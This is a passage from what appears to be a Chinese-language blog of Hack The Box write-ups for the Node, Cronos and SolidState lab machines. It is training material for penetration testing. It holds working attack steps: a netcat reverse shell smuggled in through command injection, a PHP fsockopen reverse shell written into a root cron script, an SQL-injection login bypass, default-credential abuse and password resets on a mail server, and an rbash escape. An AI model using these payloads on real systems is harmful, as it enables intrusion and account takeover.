Encrypted\n```\n确实是会被压缩为 zip 文件\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# unzip base_encode \nArchive:  base_encode\n   skipping: root.txt                need PK compat. v5.1 (can do v4.6)\n```\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# cat root.txt     \nQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\nQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\nQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\nQQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ\nQQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~\"\"??9VWQQQQQQQQQQQQQQQQQQQ\nQQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,\"?9$QQQQQQQQQQQQQQ\nQQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ\nQQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ\nQQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ\nQQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ\nQQQQQQQP'.yQQQQQQQQQQQP\"       <wa,.!4WQQQQQQQWdWP??!\"??4WWQQQWQQc ?QWQQQQQ\nQQQQQP'_a.<aamQQQW!<yF \"!` ..  \"??$Qa \"WQQQWTVP'    \"??' =QQmWWV?46/ ?QQQQQ\nQQQP'sdyWQP?!`.-\"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ\nQQ[ j@mQP'adQQP4ga, -????\" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?\"`  -?QzQ7L ]QQQ\nQW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc \"4QQQQa   .QP4QQQQfWkl jQQQ\nQE ]QkQk $D?`  waa \"?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`\"QQQD\\Qf(.QWQQ\nQQ,-Qm4Q/-QmQ6 \"WWQma/  \"??QQQQQQL 4W\"- -?$QQQQWP`s,awT$QQQ@  \"QW@?$:.yQQQQ\nQQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'<mWWWWWQW?^  ` ]6QQ' yQQQQQ\nQQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  \"????9VWaamQWV???\"  a j/  ]QQf jQQQQQQ\nQQQQQQw,\"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ\nQQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ\nQQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ\nQQQQQQQQQQ,\"$WQQWQQQQg,.\"?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ\nQQQQQQQQQWQa ?$WQQWQQQQQa,.\"?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ\nQQQQQQQQQQWWma \"9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ\nQQQQQQQQQQQQQQQws \"Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ\nQQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ\nQQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ\nQQQQQQQQQQQQQQQQQQQQQQWWQQga,-\"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ\nQQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW\nQQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ\nQQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^\"!???????!^`_saQWWQQQQQQQ\nQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ\nQQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ\n```\n使用解压密码 magicword 进行查看后，得到了刚才我们发现了有趣的笑脸，查看代码后判断应该是关键字被列入黑名单了\n\n```bash\n/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt\n```\n我们使用通配符绕过黑名单\n\n```bash\ntom@node:/usr/local/bin$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt                                                                                                           \n<ac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt                                                                                                                                                               \nUEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWUoAy1l1eAsAAQQAAAAABAAAAACh3rCOvOQdB5V16DWzjmraL4LSDQyRE+gYobSHgwWoyN2auhvRchazKrlNmtBQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA\n```\n再去使用之前获得的解压密码 magicword 进行解压\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# cat data    \nUEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWXLP2GJ1eAsAAQQAAAAABAAAAABxTsld158Zh1jLqaTlLhGh3omZpdVMsbbF4rimamhoJAz6zDqxvNxiE/AktcJQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA\n\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# base64 -d data > data_encode          \n\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# file data_encode \ndata_encode: Zip archive data, at least v1.0 to extract, compression method=store\n\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# unzip data_encode \nArchive:  data_encode\n[data_encode] root/root.txt password: \n extracting: root/root.txt           \n\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# cat root/root.txt \n1722e99ca5f353b362556a62bd5e6be0\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Cronos - Hackthebox","url":"/2022/07/14/Hackthebox/Medium/Hackthebox-Cronos/","content":"\n# Hackthebox - Cronos\n# 靶场信息\n![](Hackthebox-Cronos/67128da5-1ac4-44a6-a2de-c2db0f868ce1.png)\n\n# 靶场类型\n![](Hackthebox-Cronos/c9796dd4-0ff5-449f-b3c1-2de36d4ed32f.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.13\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 09:52 CST\nWarning: 10.10.10.13 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.10.13\nHost is up (0.38s latency).\nNot shown: 65518 closed tcp ports (reset)\nPORT      STATE    SERVICE VERSION\n22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)\n|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)\n|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)\n53/tcp    open     domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.10.3-P4-Ubuntu\n80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n11077/tcp filtered unknown\n16431/tcp filtered unknown\n23675/tcp filtered unknown\n23791/tcp filtered unknown\n24707/tcp filtered unknown\n28968/tcp filtered unknown\n30070/tcp filtered unknown\n33874/tcp filtered unknown\n36836/tcp filtered unknown\n37062/tcp filtered unknown\n41846/tcp filtered unknown\n42917/tcp filtered unknown\n45607/tcp filtered unknown\n51186/tcp filtered unknown\nAggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Linux 3.12 (93%), Linux 3.13 (93%), Linux 3.8 - 3.11 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   368.17 ms 10.10.14.1\n2   468.12 ms 10.10.10.13\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 87.93 seconds\n```\n## Http\n![](Hackthebox-Cronos/d025b17e-55e9-473e-aa8a-5c3aa18a8669.png)\n\n默认的 apache 页面，fuzz 页面也没有可用的东西，可能在子域名\n\n## 子域名\n加一个 host 解析\n\n```bash\necho 10.10.10.13 cronos.htb >> /etc/hosts\n```\n然后跑一个子域名\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# ffuf -u 'http://cronos.htb/' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host:FUZZ.cronos.htb' -fs 0,11439\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://cronos.htb/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.cronos.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response size: 0,11439\n________________________________________________\n\nadmin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 5550ms]\nwww                     [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 1331ms]\n```\n![](Hackthebox-Cronos/c14290bd-a94b-4907-af49-1fee44a80db5.png)\n\nfuzz 出有一个 admin，然后这边是加上 host 解析后，有了不同的变化\n\n把解析出来的子域名给加个 hosts 解析\n\n```bash\necho 10.10.10.13 admin.cronos.htb >> /etc/hosts\n```\n![](Hackthebox-Cronos/aa9434e6-e52a-4061-a083-11b9720b32ec.png)\n\n这边有一个登陆点，但是没有密码\n\n# 漏洞利用\n![](Hackthebox-Cronos/dc7220e5-c315-42b4-ab1b-d849145c0e89.png)\n\n测试了一下存在 sql 注入，可直接使用万能密码进行登录\n\n![](Hackthebox-Cronos/5e7fa2df-3927-4a0f-b8b7-31c992d700ad.png)\n\n登入后有一个 traceroute 和 ping 功能，和 DVWA 相似啊，应该是可以拼接直接执行命令\n\n![](Hackthebox-Cronos/3e09e155-33cd-45c5-a035-cc220bd33f92.png)\n\n去尝试一下是否可执行\n\n![](Hackthebox-Cronos/b141a31f-738d-4a56-ba8e-ef0d8c5add89.png)\n\n确定可以执行命令\n\n使用 nc 进行监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n```bash\n127.0.0.1|rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f\n```\n使用如上语句来进行反弹 shel\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nc -nvlp 4444                                      \nlistening on [any] 4444 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.10.13] 57784\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功获得一个 shel\n\n```bash\nwww-data@cronos:/home/noulis$ cat user.txt\ncat user.txt\nacd300bee378d6a90aece189fc7ce7f6\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n```bash\n╔══════════╣ Cron jobs\n╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                      \n/usr/bin/crontab                                                                                                                                                                                                                            \nincrontab Not Found\n-rw-r--r-- 1 root root     797 Apr  9  2017 /etc/crontab                                                                                                                                                                                    \n\n/etc/cron.d:\ntotal 24\ndrwxr-xr-x  2 root root 4096 May 10 14:51 .\ndrwxr-xr-x 95 root root 4096 May 10 14:51 ..\n-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder\n-rw-r--r--  1 root root  589 Jul 16  2014 mdadm\n-rw-r--r--  1 root root  670 Mar  1  2016 php\n-rw-r--r--  1 root root  191 Mar 22  2017 popularity-contest\n\n/etc/cron.daily:\ntotal 60\ndrwxr-xr-x  2 root root 4096 May 10 14:51 .\ndrwxr-xr-x 95 root root 4096 May 10 14:51 ..\n-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder\n-rwxr-xr-x  1 root root  539 Apr  6  2016 apache2\n-rwxr-xr-x  1 root root  376 Mar 31  2016 apport\n-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat\n-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils\n-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg\n-rwxr-xr-x  1 root root  372 May  6  2015 logrotate\n-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db\n-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm\n-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate\n-rwxr-xr-x  1 root root  249 Nov 13  2015 passwd\n-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest\n-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common\n\n/etc/cron.hourly:\ntotal 12\ndrwxr-xr-x  2 root root 4096 May 10 14:51 .\ndrwxr-xr-x 95 root root 4096 May 10 14:51 ..\n-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder\n\n/etc/cron.monthly:\ntotal 12\ndrwxr-xr-x  2 root root 4096 May 10 14:51 .\ndrwxr-xr-x 95 root root 4096 May 10 14:51 ..\n-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder\n\n/etc/cron.weekly:\ntotal 24\ndrwxr-xr-x  2 root root 4096 May 10 14:51 .\ndrwxr-xr-x 95 root root 4096 May 10 14:51 ..\n-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder\n-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim\n-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db\n-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1\n```\n这边看到一个有趣的程序运行在 root 上 `/var/www/laravel/artisan` \n\n```bash\nwww-data@cronos:/var/www/laravel$ ls -la /var/www/laravel/artisan\nls -la /var/www/laravel/artisan\n-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan\n```\n这边是可以看到，我们拥有写入权限，看看这是什么东西\n\n```bash\nwww-data@cronos:/var/www/laravel$ cat artisan\ncat artisan\n#!/usr/bin/env php\n<?php\n\n/*\n|--------------------------------------------------------------------------\n| Register The Auto Loader\n|--------------------------------------------------------------------------\n|\n| Composer provides a convenient, automatically generated class loader\n| for our application. We just need to utilize it! We'll require it\n| into the script here so that we do not have to worry about the\n| loading of any our classes \"manually\". Feels great to relax.\n|\n*/\n\nrequire __DIR__.'/bootstrap/autoload.php';\n\n$app = require_once __DIR__.'/bootstrap/app.php';\n\n/*\n|--------------------------------------------------------------------------\n| Run The Artisan Application\n|--------------------------------------------------------------------------\n|\n| When we run the console application, the current CLI command will be\n| executed in this console and the response sent back to a terminal\n| or another output device for the developers. Here goes nothing!\n|\n*/\n\n$kernel = $app->make(Illuminate\\Contracts\\Console\\Kernel::class);\n\n$status = $kernel->handle(\n    $input = new Symfony\\Component\\Console\\Input\\ArgvInput,\n    new Symfony\\Component\\Console\\Output\\ConsoleOutput\n);\n\n/*\n|--------------------------------------------------------------------------\n| Shutdown The Application\n|--------------------------------------------------------------------------\n|\n| Once Artisan has finished running. We will fire off the shutdown events\n| so that any final work may be done by the application before we shut\n| down the process. This is the last thing to happen to the request.\n|\n*/\n\n$kernel->terminate($input, $status);\n\nexit($status);\n```\n似乎是一个 php 的脚本，干啥的咱就别管他了，咱们可以写入一个用 php 反弹 shell 的语句进去，进行反弹\n\n再开个 nc 进行一个其他端口的监听\n\n```bash\nnc -nvlp 5555\n```\n```bash\necho '<?php $sock=fsockopen(\"10.10.14.4\",5555);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>' > /var/www/laravel/artisan\n```\n然后执行后，等待一会儿就行了\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nc -nvlp 5555                                       \nlistening on [any] 5555 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.10.13] 53042\n/bin/sh: 0: can't access tty; job control turned off\n# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功提权到 root 权限\n\n```bash\n# cat /root/root.txt\n817402c7d13dc6ad8eff1f1af36d3382\n```\n成功获得 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"SolidState - Hackthebox","url":"/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/","content":"\n# Hackthebox - SolidState\n# 靶场信息\n![](Hackthebox-SolidState/4c71c978-a696-4953-a7f3-e15854c05553.png)\n\n# 靶场类型\n![](Hackthebox-SolidState/f951eea4-6c8a-44c6-85ad-b1aa4651162d.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.51\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 09:27 CST\nNmap scan report for 10.10.10.51\nHost is up (0.38s latency).\nNot shown: 65529 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)\n| ssh-hostkey: \n|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)\n|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)\n|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)\n25/tcp   open  smtp    JAMES smtpd 2.3.2\n|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.19 [10.10.14.19]), PIPELINING, ENHANCEDSTATUSCODES\n80/tcp   open  http    Apache httpd 2.4.25 ((Debian))\n|_http-title: Home - Solid State Security\n|_http-server-header: Apache/2.4.25 (Debian)\n110/tcp  open  pop3    JAMES pop3d 2.3.2\n|_tls-alpn: ERROR: Script execution failed (use -d to debug)\n|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n|_sslv2: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: ERROR: Script execution failed (use -d to debug)\n|_ssl-cert: ERROR: Script execution failed (use -d to debug)\n119/tcp  open  nntp?\n|_sslv2: ERROR: Script execution failed (use -d to debug)\n|_ssl-cert: ERROR: Script execution failed (use -d to debug)\n|_tls-alpn: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: ERROR: Script execution failed (use -d to debug)\n|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n4555/tcp open  rsip?\n| fingerprint-strings: \n|   GenericLines: \n|     JAMES Remote Administration Tool 2.3.2\n|     Please enter your login and password\n|     Login id:\n|     Password:\n|     Login failed for \n|_    Login id:\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port4555-TCP:V=7.92%I=7%D=7/11%Time=62CB7C97%P=aarch64-unknown-linux-gn\nSF:u%r(GenericLines,7C,\"JAMES\\x20Remote\\x20Administration\\x20Tool\\x202\\.3\\\nSF:.2\\nPlease\\x20enter\\x20your\\x20login\\x20and\\x20password\\nLogin\\x20id:\\n\nSF:Password:\\nLogin\\x20failed\\x20for\\x20\\nLogin\\x20id:\\n\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=7/11%OT=22%CT=1%CU=39286%PV=Y%DS=2%DC=T%G=Y%TM=62CB7DA\nOS:6%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=3%ISR=10F%TI=Z%CI=I%TS=8)SE\nOS:Q(SP=104%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=8)SEQ(SP=104%GCD=1%ISR=10F%TI=Z\nOS:%II=I%TS=8)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11\nOS:NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=71\nOS:20%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=4\nOS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O\nOS:=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40\nOS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q\nOS:=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y\nOS:%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1720/tcp)\nHOP RTT       ADDRESS\n1   461.02 ms 10.10.14.1\n2   434.42 ms 10.10.10.51\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 304.88 seconds\n```\n## Http\n![](Hackthebox-SolidState/1890dda5-91e3-4ae1-a5d8-24dbc717743d.png)\n\n这边我 fuzz 和寻找了一下，都没看到什么东西，咱们换个思路\n\n## 4555 端口\n这边有一个 4555 端口，这种异常端口一看就不对劲。JAMES Remote Administration Tool 2.3.2，这边扫描端口的时候有提示版本信息，去搜索一下\n\n![](Hackthebox-SolidState/cbf1f061-20d1-4023-8a92-15bd5dcb782d.png)\n\n# 漏洞利用\n得知了这是一个 pop3 协议的邮件服务器，默认账号密码都是 root，去使用 telnet 登陆一下\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# telnet 10.10.10.51 4555\nTrying 10.10.10.51...\nConnected to 10.10.10.51.\nEscape character is '^]'.\nJAMES Remote Administration Tool 2.3.2\nPlease enter your login and password\nLogin id:\nroot\nPassword:\nroot\nWelcome root. HELP for a list of commands\nhelp\nCurrently implemented commands:\nhelp                                    display this help\nlistusers                               display existing accounts\ncountusers                              display the number of existing accounts\nadduser [username] [password]           add a new user\nverify [username]                       verify if specified user exist\ndeluser [username]                      delete existing user\nsetpassword [username] [password]       sets a user's password\nsetalias [user] [alias]                 locally forwards all email for 'user' to 'alias'\nshowalias [username]                    shows a user's current email alias\nunsetalias [user]                       unsets an alias for 'user'\nsetforwarding [username] [emailaddress] forwards a user's email to another email address\nshowforwarding [username]               shows a user's current email forwarding\nunsetforwarding [username]              removes a forward\nuser [repositoryname]                   change to another user repository\nshutdown                                kills the current JVM (convenient when James is run as a daemon)\nquit                                    close connection\n```\n登陆成功，命令中有列账号的功能和重置密码的功能，去看一下\n\n```bash\nUnknown command \nlistusers\nExisting accounts 5\nuser: james\nuser: thomas\nuser: john\nuser: mindy\nuser: mailadmin\nsetpassword mindy admin\nPassword for mindy reset\n```\n将帐户 mindy 的密码给重置了，然后去 110 端口登陆一下\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# telnet 10.10.10.51 110 \nTrying 10.10.10.51...\nConnected to 10.10.10.51.\nEscape character is '^]'.\n+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready \nuser mindy\n+OK\npass admin\n+OK Welcome mindy\nlist\n+OK 2 1945\n1 1109\n2 836\n.\nretr 2\n+OK Message follows\nReturn-Path: <mailadmin@localhost>\nMessage-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>\nMIME-Version: 1.0\nContent-Type: text/plain; charset=us-ascii\nContent-Transfer-Encoding: 7bit\nDelivered-To: mindy@localhost\nReceived: from 192.168.11.142 ([192.168.11.142])\n          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581\n          for <mindy@localhost>;\n          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)\nDate: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)\nFrom: mailadmin@localhost\nSubject: Your Access\n\nDear Mindy,\n\nHere are your ssh credentials to access the system. Remember to reset your password after your first login. \nYour access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. \n\nusername: mindy\npass: P@55W0rd1!2@\n\nRespectfully,\nJames\n\n.\nConnection closed by foreign host.\n```\n得到了一个账号密码\n\n```bash\nusername = mindy\npassword = P@55W0rd1!2@\n```\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# ssh mindy@10.10.10.51           \nThe authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.\nED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.51' (ED25519) to the list of known hosts.\nmindy@10.10.10.51's password: \nLinux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue Aug 22 14:00:02 2017 from 192.168.11.142\nmindy@solidstate:~$ whoami&&id\n-rbash: whoami: command not found\n```\n进去了，但没完全进去\n\n```bash\nmindy@solidstate:~$ cat user.txt\n80d14d9b351c71c448bd5500e43c222e\n```\n得到了 user 权限的 flag 文件\n\n# 权限提升\n## rbash 逃逸\n```bash\nmindy@solidstate:~$ cd\n-rbash: cd: restricted\n```\n根据情况看，这是一台受限的 rbash，去想办法逃逸一下\n\n> [https://xz.aliyun.com/t/7642](https://xz.aliyun.com/t/7642)\n\n找到了一篇文章\n\n使用了其中一个指定 bash 的方法成功逃逸\n\n```bash\nssh mindy@10.10.10.51 -t \"bash --noprofile\"\n```\n成功逃逸\n\n```bash\n${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami&&id\nmindy\nuid=1001(mindy) gid=1001(mindy) groups=1001(mindy)\n```\n## Root\n查看一下当前运行的进程\n\n```bash\n${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ps aux|grep james\nroot       556  0.0  0.0  